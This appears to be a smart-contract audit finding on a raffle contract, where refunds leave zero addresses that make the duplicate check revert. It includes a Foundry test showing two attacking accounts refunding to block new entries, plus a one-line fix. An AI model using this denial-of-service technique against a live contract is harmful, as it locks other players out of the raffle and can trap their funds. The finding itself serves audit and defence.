**Title:**

Refunding a user zeroes its address in the `players` array, causing a revert on all new entries when two or more users have refunded

**Description:**

When a user is asking for a refund of his ticket, the `refund` function replaces its address by the zero address in the array, to remove his entry from the raffle. Thus, if multiple users ask for a refund in the same raffle, we will have multiple zero addresses in the array. However, when another user tries to participate to the raffle by calling the `enterRaffle` function, the contract is checking for any duplicate in the array, with this nested loop:

```javascript
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

This loop will always revert because of the multiple zero addresses inside of the `players` array, leading to 2 major issues:

1. Users will not be able to enter a raffle where 2 players asked for a refund, causing a DoS until the `players` array is cleaned through the `selectWinner` function.
2. If two participants the raffle ask for a refund before it reaches 4 players, the `selectWinner` will never be callable as needs 4 players or more to be called. The remaining player will have to call the refund function to get his funds back, and the contract will be permanently unusable.

**Impact:**

Denial of service on new raffle entries. In the worst case the contract is permanently unusable.

**Proof of Concept:**

Actors:
- Players: Normal players entering the raffle.
- Attackers: Malicious players entering the raffle to create a DoS.

```javascript
function test_RaffleDoS() public {
    // First participant is entering the raffle
    address[] memory player_1 = new address[](1);
    player_1[0] = playerOne;
    puppyRaffle.enterRaffle{value: entranceFee}(player_1);

    // A group of two malicious participants are entering the raffle
    address[] memory attackers = new address[](2);
    attackers[0] = attackerOne;
    attackers[1] = attackerTwo;
    puppyRaffle.enterRaffle{value: entranceFee * 2}(attackers);

    // First attacker is refunding his ticket
    uint256 indexOfAttackerOne = puppyRaffle.getActivePlayerIndex(attackerOne);
    vm.prank(attackerOne);
    puppyRaffle.refund(indexOfAttackerOne);

    // Second attacker is refunding his ticket too
    uint256 indexOfAttackerTwo = puppyRaffle.getActivePlayerIndex(attackerTwo);
    vm.prank(attackerTwo);
    puppyRaffle.refund(indexOfAttackerTwo);

    // Another participant tries to enter the raffle,
    // but it will revert because of the duplicate zero addresses
    address[] memory player_2 = new address[](1);
    player_2[0] = playerTwo;
    vm.expectRevert("PuppyRaffle: Duplicate player");
    puppyRaffle.enterRaffle{value: entranceFee}(player_2);

    // Now there are 3 players in the raffle, and no new participant can enter the raffle
    // This does mean that we will never be able to call the selectWinner function
    vm.warp(block.timestamp + duration);
    vm.expectRevert("PuppyRaffle: Need at least 4 players");
    puppyRaffle.selectWinner();

    // Now the only way for playerOne to get his funds back is to call the refund function
    uint256 indexOfPlayerOne = puppyRaffle.getActivePlayerIndex(playerOne);
    vm.prank(playerOne);
    puppyRaffle.refund(indexOfPlayerOne);
}
```

**Recommended Mitigation:**

To mitigate this critical vulnerability, we advice the following changes on the `enterRaffle` function:
```diff
for (uint256 i = 0; i < players.length - 1; i++) {
+   if (players[i] == address(0)) continue;
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```
This will avoid checking for duplicates on zero addresses.
